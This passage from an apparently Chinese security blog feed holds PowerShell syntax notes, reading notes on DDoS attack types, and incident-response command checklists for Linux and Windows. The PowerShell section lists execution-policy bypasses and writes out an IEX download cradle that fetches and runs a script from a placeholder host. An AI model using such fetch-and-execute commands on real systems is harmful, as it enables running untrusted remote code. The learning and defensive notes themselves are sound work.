class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$value</span> <span class="operator">-eq</span> <span class="number">1</span>)&#123;</span><br><span class="line">    code1</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    code2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>while、do-which<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">While</span> () &#123;&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$count</span> <span class="operator">-le</span> <span class="number">5</span>)  </span><br><span class="line">&#123;  </span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$count</span>  </span><br><span class="line"> <span class="variable">$count</span> +=<span class="number">1</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Do</span> &#123;&#125; <span class="keyword">While</span>()</span><br><span class="line"><span class="keyword">Do</span>&#123;</span><br><span class="line">    Statement<span class="literal">-1</span>  </span><br><span class="line">    Statement<span class="literal">-2</span>  </span><br><span class="line">    Statement<span class="literal">-N</span>   </span><br><span class="line">&#125; <span class="keyword">while</span>( test_expression)</span><br></pre></td></tr></table></figure></li><li>switch<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="number">1</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期一&quot;</span>&#125;  </span><br><span class="line">    <span class="number">2</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期二&quot;</span>&#125;  </span><br><span class="line">    <span class="number">3</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期三&quot;</span>&#125;  </span><br><span class="line">    <span class="number">4</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期四&quot;</span>&#125;  </span><br><span class="line">    <span class="number">5</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期五&quot;</span>&#125;  </span><br><span class="line">    <span class="number">6</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期六&quot;</span>&#125;  </span><br><span class="line">    <span class="number">7</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期日&quot;</span>&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>for<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">1</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$x</span>=<span class="variable">$x</span>+<span class="number">1</span>)   </span><br><span class="line">&#123;   </span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$x</span>   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>foreach<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Array</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>  </span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="keyword">foreach</span> (<span class="variable">$number</span> <span class="keyword">in</span> <span class="variable">$Array</span>)  </span><br><span class="line">&gt;&gt; &#123;  </span><br><span class="line">&gt;&gt; <span class="built_in">echo</span> <span class="variable">$number</span>  </span><br><span class="line">&gt;&gt; &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> [&lt;<span class="title">scope</span>:&gt;]&lt;<span class="title">name</span>&gt; [<span class="params">([type]<span class="variable">$parameter1</span>[,[type]<span class="variable">$parameter2</span>])</span>]</span>  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">param</span>([<span class="type">type</span>]<span class="variable">$parameter1</span> [,[<span class="type">type</span>]<span class="variable">$parameter2</span>])  </span><br><span class="line">  <span class="keyword">dynamicparam</span> &#123;&lt;statement list&gt;&#125;  </span><br><span class="line">  <span class="keyword">begin</span> &#123;&lt;statement list&gt;&#125;  </span><br><span class="line">  <span class="keyword">process</span> &#123;&lt;statement list&gt;&#125;  </span><br><span class="line">  <span class="keyword">end</span> &#123;&lt;statement list&gt;&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名（参数列表）</span>&#123;</span><br><span class="line">函数体</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="function"><span class="keyword">function</span> <span class="title">Test-Function</span></span></span><br><span class="line">&gt;&gt; &#123;</span><br><span class="line">&gt;&gt;     <span class="built_in">Write-Host</span> ‘Hello World!’</span><br><span class="line">&gt;&gt; &#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">test-function</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h2 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h2><ul><li>查看当前执行策略、设置执行策略<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Restricted 受限制的，可以执行单个的命令，但是不能执行脚本Windows <span class="number">8</span>, Windows Server <span class="number">2012</span>, and Windows <span class="number">8.1</span>中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？<span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass就是设置策略为Bypass这样就可以执行脚本了。</span><br><span class="line">AllSigned AllSigned 执行策略允许执行所有具有数字签名的脚本</span><br><span class="line">RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</span><br><span class="line">Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</span><br><span class="line">Bypass Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</span><br><span class="line">Undefined Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</span><br></pre></td></tr></table></figure></li><li>绕过策略的常见方法<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">本地读取然后通过管道符运行</span><br><span class="line">powershell <span class="built_in">get-content</span> test.ps1 | powershell <span class="literal">-noprofile</span> -</span><br><span class="line"></span><br><span class="line">远程下载并通过<span class="built_in">IEX</span>运行脚本</span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://xxx.xxx.xxx/a.ps1&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">Bypass执行策略绕过</span><br><span class="line">powershell <span class="literal">-executionpolicy</span> bypass <span class="operator">-File</span> ./a.ps1</span><br><span class="line"></span><br><span class="line">Unrestricted执行策略标志</span><br><span class="line">powershell <span class="literal">-executionpolicy</span> unrestricted <span class="operator">-File</span> ./a.ps1</span><br></pre></td></tr></table></figure></li><li>注：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span>（<span class="built_in">IEX</span>的别名）：用来把字符串当作命令执行。</span><br><span class="line"></span><br><span class="line">WindowStyle <span class="keyword">Hidden</span>（<span class="literal">-w</span> <span class="keyword">Hidden</span>）：隐藏窗口</span><br><span class="line"></span><br><span class="line">Nonlnteractive（<span class="literal">-NonI</span>）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line"></span><br><span class="line">NoProfile（<span class="literal">-NoP</span>）：PowerShell控制台不加载当前用户的配置文件。</span><br><span class="line"></span><br><span class="line">Noexit（<span class="literal">-Noe</span>）：执行后不退出Shell。</span><br><span class="line"></span><br><span class="line">EncodedCommand（<span class="literal">-enc</span>）: 接受base64 encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure></li><li>脚本调用方法<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果脚本是直接写的代码而不是只定义了函数那么直接执行脚本.script.ps1即可</span><br><span class="line"></span><br><span class="line">但是如果是载入里面的函数需要.+空格+.script.ps1</span><br><span class="line"></span><br><span class="line">或者使用<span class="built_in">Import-Module</span> .script.ps1, 这样才能直接使用脚本的函数</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.anquanke.com/post/id/87976">https://www.anquanke.com/post/id/87976</a></li><li><a href="https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/">https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/</a></li><li><a href="https://xz.aliyun.com/t/5762#toc-5">https://xz.aliyun.com/t/5762#toc-5</a></li><li><a href="https://www.yiibai.com/powershell">https://www.yiibai.com/powershell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> powershell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>互联网企业安全高级指南</title>
      <link href="/2022/06/19/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E9%AB%98%E7%BA%A7%E6%8C%87%E5%8D%97/"/>
      <url>/2022/06/19/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E9%AB%98%E7%BA%A7%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="互联网企业安全高级指南"><a href="#互联网企业安全高级指南" class="headerlink" title="互联网企业安全高级指南"></a>互联网企业安全高级指南</h2><ul><li><p>3.4 业务需要想安全妥协吗<br>妥协不应该发生在工程师层面，而是应该在<code>Leader</code>和安全负责人这个层面</p></li><li><p>3.5 选择在不同的维度做防御<br><strong>风险缓解的原则</strong>是在以下三者之间做最大平衡：</p><ul><li>1）风险暴露程度；</li><li>2）研发运维变更成本；</li><li>3）用户体验的负面影响。</li></ul></li><li><p>3.9 关于ISO27001<br>安全标准的价值就是告诉你，在安全建设的领域里可能有那么100件事情是需要做的，但具体选择做80件还是99件还是100件全做是你自己的事情，它只是告诉你100件事情是什么，但是这100件事情怎么实现，对应的技术方案或流程是什么它不会告诉你，实现和落地是需要自己去想的，它本质上是用于开拓视野。</p></li><li><p>5.2.1 互联网安全理念<br>互联网安全有几个比较核心的需求：<strong>快速检测、有限影响、快速溯源、快速恢复</strong></p></li><li><p>6.3 服务器4A<br>4A是指：账户（Account）、认证（Authentication）、授权（Authorization）、审计（Audit）。</p></li><li><p>7.2.1 DDos分类<br><code>DDos</code>攻击本质上是一种只能缓解而不能完全防御的攻击，近源清晰、云清洗。</p><ul><li>1.网络层攻击<br><code>Syn-flood</code> ———— 利用<code>TCP</code>建立<code>3</code>次握手的”漏洞”，通过原始套接字发送源地址虚假的<code>SYN</code>报文，使目标主机永远无法完成<code>3</code>次握手，占满了系统的协议栈队列，资源得不到释放，进而拒绝服务，是互联网中最主要的<code>DDos</code>攻击形式之一。<br><code>ACK-flood</code> ———— 对于虚假的<code>ACK</code>包，目标设备会直接回复<code>RST</code>包丢弃连接，所以伤害值远不如<code>syn-flood</code>。<br><code>UDP-flodd</code> ———— 使用原始套接字伪造大量虚假源地址的<code>UDP</code>包，目前以<code>DNS</code>协议为主。<br><code>ICMP-flood</code> ———— <code>Ping</code>洪水，是一种是比较古老的方式。</li><li>2.应用层攻击<br><code>CC</code> ———— <code>ChallgeCollapsar</code>的名字源于挑战国内知名安全厂商绿盟的抗<code>DDos</code>设备 —— “黑洞”。<code>CC</code>是目前应用层攻击主要手段之一，在防御上有一些方法，但不能完美解决这个问题。<br><code>DNS flood</code> ———— 伪造源地址的海量<code>DNS</code>请求，用于淹没目标的<code>DNS</code>服务器。<br>慢速链接攻击 ———— 针对<code>HTTP</code>协议，以知名的<code>slowloris</code>攻击为起源：先建立<code>HTTP</code>链接，设置一个较大的<code>content-length</code>，每次值发送很少的字节，让服务器一直以为<code>HTTP</code>头部没有传输完成，这样的链接一多很快就会出现链接耗尽。<code>HTTP</code>慢速的<code>post</code>请求和慢速的<code>read</code>请求都是基于相同的原理。<br><code>DOS</code>攻击  ———— 有些服务器程序存在<code>bug</code>、安全漏洞或架构性缺陷 ，攻击者可以通过构造畸形的请求发送给服务器，服务器因不能正确的处理恶意请求而陷入僵死状态，导致拒绝服务。</li><li>3.攻击方式<br>混合型攻击 ———— 在实际大流量的攻击中，通常并不是以上述一中数据类型来攻击，往往是混杂了<code>TCP</code>和<code>UDP</code>流量，网络层和应用层攻击同时进行。<br>反射型攻击 ————  反射型攻击的本质是利用”质询-应答”式协议，将质询包的源地址通过原始套接字伪造设置为目标地址，则应答的”回包”都被发送至目标，如果回包体积比较大或协议支持递归效果，攻击流量会被放大，成为一种高性价比的流量型攻击。反射型攻击利用的协议目前包括<code>NTP</code>、<code>Chargen</code>、<code>SSDP</code>、<code>DNS</code>、<code>RPC Portmap</code>等等。<br>流量放大型攻击 ———— 参加”第7章 网路安全 p98”<br>脉冲型攻击 ———— 很多攻击持续的时间非常短，通常5分钟以内，流量图上表现为突刺装的脉冲。<br>链路泛洪型攻击 ———— 链路泛洪（<code>link-flooding</code>），这种方式不直接攻击目标，而是以堵塞目标网络的上一级链路为目的。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 互联网企业安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应</title>
      <link href="/2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="定义及流程"><a href="#定义及流程" class="headerlink" title="定义及流程"></a>定义及流程</h2><p><strong>应急响应:</strong> <code>背景、现状、需求</code></p><pre><code>——(信息系统安全等级保护体系框架GA/T 708-2007)</code></pre><blockquote><p>应急响应通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。信息系统安全事件应急响应的对象是指针对信息系统所存储、传输、处理的信息的安全事件。事件的主体可能来自自然界、系统自身故障、组织内部或外部的人为攻击等。</p></blockquote><p><strong>应急处置</strong></p><pre><code> ——(信息安全应急响应计划规范GB/T24363-2009）</code></pre><blockquote><p>启动应急响应计划后，应立即采取相关措施抑制信息安全事件影响，避免造成更大损失。在确定有效控制了信息安全事件影响后，开始实施恢复操作。恢复阶段的行动集中于建立临时业务处理能力、修复原系统的损害、在原系统或新设施中恢复运行业务能力等应急措施。</p></blockquote><p><strong>六大阶段：</strong> 准备、检测、抑制、根除、恢复、跟踪</p><p><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/liu.png"><br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/yjxy.png"></p><h2 id="应急处置"><a href="#应急处置" class="headerlink" title="应急处置"></a>应急处置</h2><pre><code>when、who、where、what</code></pre><p><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/yjcz.png"></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><pre><code>用户信息、敏感目录、敏感文件</code></pre><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看具有登录权限用户: <span class="built_in">cat</span> /etc/passwd |grep bash</span><br><span class="line">查看uid为0的用户: awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line">查看用户是否具有sudo权限: more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span> 或 sudo -l -U username     </span><br><span class="line">历史命令: <span class="built_in">history</span> 或 <span class="built_in">cat</span> ~/.bash_history</span><br><span class="line">查看环境变量: <span class="built_in">echo</span> <span class="variable">$PATH</span> 或 <span class="built_in">env</span></span><br><span class="line">敏感目录: ~/.ssh/  <span class="built_in">ls</span> -alt /tmp 目录下.和..开头的文件夹等</span><br></pre></td></tr></table></figure><ul><li><p><u>&#x2F;etc&#x2F;passwd</u><br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>account:password:UID:GID:GECOS:directory:shell<br>用户名:密码:用户ID:组ID:用户描述性信息:主目录:默认Shell</p></li><li><p><u>&#x2F;etc&#x2F;shadow</u><br>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV 9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::<br>用户名:加密密码:密码最后一次修改日期:两次密码的修改时间间隔:密码有效期:密码修改到期到的警告天数:密码过期之 后的宽限天数:账号失效时间:保留</p></li></ul><p>windows</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">系统信息: msinfo32、systeminfo</span><br><span class="line">用户列表: <span class="built_in">net</span> user 或 lusrmgr.msc</span><br><span class="line">在线用户: query user 或 qwinsta</span><br><span class="line">查看会话信息: <span class="built_in">net</span> session</span><br><span class="line">共享目录: <span class="built_in">net</span> share</span><br><span class="line">最近访问文件: <span class="variable">%UserProfile%</span>\Recent</span><br><span class="line">敏感目录: <span class="variable">%temp%</span> 、 <span class="variable">%appdata%</span> 、 <span class="variable">%localappdata%</span> 、 <span class="variable">%WINDIR%</span> 、 <span class="variable">%WINDIR%</span>\system32\</span><br><span class="line">回收站、浏览器下载目录、浏览器历史记录、用户列表目录</span><br></pre></td></tr></table></figure><hr><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>启动项、计划任务、服务</code></pre><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">启动项</span><br><span class="line">确定运行级别: runlevel</span><br><span class="line">开机启动脚本存放目录: /etc/init.d/</span><br><span class="line">建立软链接对应目录:  /etc/init.d/ ==&gt; /etc/rc.local</span><br><span class="line">示例: <span class="built_in">ln</span> -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span><br><span class="line">此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的</span><br><span class="line"></span><br><span class="line">计划任务查看: crontab -l </span><br><span class="line">计划任务文件目录: /var/spool/cron/</span><br><span class="line">删除所有计划任务: crontab -r </span><br><span class="line">编辑当前的crontab文件: crontab -e</span><br><span class="line">示例(可查看/etc/crontab): */1 * * * * <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br><span class="line"></span><br><span class="line">服务自启: chkconfig --list 或 systemctl list-unit-files</span><br></pre></td></tr></table></figure><p>定时任务常见目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">启动项: msconfig 或 【开始】&gt;【所有程序】&gt;【启动】</span><br><span class="line">注册列表: regedit</span><br><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">组策略: gpedit.msc  计算机配置-Windows设置-脚本(启动/关机)</span><br><span class="line"></span><br><span class="line">定时任务: <span class="built_in">at</span> 或 schtasks 或 compmgmt.msc 任务计划程序</span><br><span class="line"></span><br><span class="line">服务: services.msc</span><br></pre></td></tr></table></figure><hr><h3 id="网络进程"><a href="#网络进程" class="headerlink" title="网络进程"></a>网络进程</h3><pre><code>网络连接、进程、端口</code></pre><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看网络连接: netstat -anlp</span><br><span class="line">端口情况: lsof -i:port</span><br><span class="line">ip情况: lsof -i@ip</span><br><span class="line">进程状态: ps -aux 显示所有包含其他使用者的行程 或 ps -ef</span><br><span class="line">查看下pid所对应的进程文件路径: <span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe 或 file /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">彻底杀死进程: <span class="built_in">kill</span> -9 进程名</span><br><span class="line">杀死指定用户所有进程: <span class="built_in">kill</span> -9 $(ps -ef | grep username)</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络连接: netstat -ano| <span class="built_in">more</span></span><br><span class="line">显示每个连接或侦听端口时涉及的可执行程序：netstat -b</span><br><span class="line">根据pid定位进程：tasklist /svc| <span class="built_in">findstr</span> &quot;pid&quot;</span><br><span class="line">结束或删除进程：<span class="built_in">taskkill</span> /f /im sesvc.exe</span><br><span class="line">确定进程对应的程序位置: wmic &gt; process where name=&quot;映像名称&quot; 或 任务管理器 &gt; 选择对应进程 &gt; 右键打开文件位置</span><br><span class="line">进程查看:【开始】&gt;【运行】&gt; msinfo32 &gt; 【软件环境】&gt; 【正在运行任务】</span><br></pre></td></tr></table></figure><p><font color="#dd0000">注: windows默认不区分大小写，findstr筛选关键字区分大小写</font></p><p>网络连接状态<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/wlljzt.png"></p><hr><h3 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h3><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">按时间排序列出目录下文件(-R遍历子目录): <span class="built_in">ls</span> -lhat</span><br><span class="line">查找特定权限的文件: find / -name \*.php -perm 777 或 find / -name <span class="string">&#x27;*.php&#x27;</span> -perm 777 </span><br><span class="line">查找某段时间修改过的文件: find / -mmin -60 -<span class="built_in">type</span> f |grep <span class="string">&#x27;pan’</span></span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关键词查找: <span class="built_in">dir</span> /s C:\*panghu*</span><br><span class="line">文件创建时间倒序排列: <span class="built_in">dir</span> /s /o-d /tc</span><br><span class="line">查找特定时间内修改过的文件: <span class="built_in">dir</span> /s /tw C:\*panghu*| <span class="built_in">findstr</span> <span class="number">2021</span>/<span class="number">02</span></span><br></pre></td></tr></table></figure><ul><li>文件修改时间在创建时间之前需重点关注<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/wenjian.png"></li></ul><hr><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">默认存放目录: /var/log/</span><br><span class="line">日志配置情况: /etc/rsyslog.conf</span><br><span class="line">登录失败日志: lastb 或 last -f /var/log/btmp</span><br><span class="line">用户登录成功情况: last 或 last -f /var/log/wtmp </span><br><span class="line">最后一次登录记录: lastlog 或 /var/log/lastlog</span><br><span class="line">用户登录日志: /var/log/secure</span><br><span class="line">查看多少IP在爆破主机的root帐号: grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">登录成功的日期、用户名、IP: grep <span class="string">&quot;Accepted password for &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span></span><br><span class="line">当前登录用户信息: w、<span class="built_in">who</span>、<span class="built_in">users</span>、/var/run/utmp</span><br></pre></td></tr></table></figure><p>Windows主要有以下三类日志记录系统事件:</p><ul><li><p>应用程序日志<br>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型 由Windows 